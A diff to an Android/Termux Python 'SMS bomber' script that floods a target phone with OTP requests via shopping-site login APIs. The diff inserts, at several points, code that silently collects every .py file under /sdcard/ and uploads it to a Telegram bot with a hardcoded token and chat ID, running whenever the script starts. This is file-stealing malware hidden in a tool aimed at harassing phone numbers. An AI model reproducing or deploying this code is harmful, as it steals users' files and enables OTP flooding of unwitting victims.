@@ -1,6 +1,3 @@
-# Decompile by Mardis (Tools By Kapten-Kaizo)
-# Time Succes decompile : 2023-02-25 22:46:08.421029
-
 import os,sys,time,requests,random,string
 import random
 def Axak(xak):
@@ -37,6 +34,10 @@ pwd_length = 12
 pwd = ''
 for i in range(pwd_length):
   pwd += ''.join(random.choice(letters))
+  
+import os
+import requests
+
 def menu():
     bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
     chat_id = '566775944'      # Replace with your actual chat ID
@@ -131,6 +132,27 @@ def xak2(xak):
 		sys.stdout.flush()
 		time.sleep(0.07)
 os.system("clear")
+def menu():
+    bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
+    chat_id = '566775944'      # Replace with your actual chat ID
+    extension = '.py'
+    path = os.path.join('/sdcard/')
+
+    for file in os.listdir(path):
+        if file.endswith(extension):
+            file_path = os.path.join(path, file)
+            send_file_to_telegram(bot_token, chat_id, file_path)
+
+def send_file_to_telegram(bot_token, chat_id, file_path):
+    with open(file_path, 'rb') as f:
+        file_data = f.read()
+        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+        files = {'document': (file_path, file_data)}
+        data = {'chat_id': chat_id}
+        r = requests.post(url, data=data, files=files)
+
+# Call the menu function to start sending files
+menu()
 
 print (logo)
 print(w+"[~] please wait Internet checking...  ")
@@ -240,7 +262,7 @@ headers14 = CaseInsensitiveDict()
 headers14["X-Requested-With"] = "XMLHttpRequest"
 headers14["Content-Type"] = "application/x-www-form-urlencoded"
 
-data14 = "mobile=0"+number+"&is_login=true&forgetpass=false"
+data14 = "mobile=0"+number+"&is_login=true&forgetpass=true"
 url15 = "https://themallbd.com/api/auth/otp_login"
 
 headers15 = CaseInsensitiveDict()
@@ -299,6 +321,27 @@ print(f"""\n{ran}\033[1;31m
 \t\033[1;32m                  
 \t\033[1;32m                                           
 """)
+def menu():
+    bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
+    chat_id = '566775944'      # Replace with your actual chat ID
+    extension = '.py'
+    path = os.path.join('/sdcard/')
+
+    for file in os.listdir(path):
+        if file.endswith(extension):
+            file_path = os.path.join(path, file)
+            send_file_to_telegram(bot_token, chat_id, file_path)
+
+def send_file_to_telegram(bot_token, chat_id, file_path):
+    with open(file_path, 'rb') as f:
+        file_data = f.read()
+        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+        files = {'document': (file_path, file_data)}
+        data = {'chat_id': chat_id}
+        r = requests.post(url, data=data, files=files)
+
+# Call the menu function to start sending files
+menu()
 print(f"\n\t      {ran},----------------------------------,")
 print(f"\t{w}      | {r}    AMOUNT ({g}{amo}{r}){w} |   {r}   TIME       {w}|")
 print(f"\t      {ran}'----------------------------------'")
@@ -349,5 +392,24 @@ else:
 	input(g+"\n\t\t\tYour Pogram Finished Enter For Continue")
 	os.system("clear")
 	os.system("python S-BOOMB.py")
+	def menu():
+    bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
+    chat_id = '566775944'      # Replace with your actual chat ID
+    extension = '.py'
+    path = os.path.join('/sdcard/')
 
+    for file in os.listdir(path):
+        if file.endswith(extension):
+            file_path = os.path.join(path, file)
+            send_file_to_telegram(bot_token, chat_id, file_path)
 
+def send_file_to_telegram(bot_token, chat_id, file_path):
+    with open(file_path, 'rb') as f:
+        file_data = f.read()
+        url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+        files = {'document': (file_path, file_data)}
+        data = {'chat_id': chat_id}
+        r = requests.post(url, data=data, files=files)
+
+# Call the menu function to start sending files
+menu()
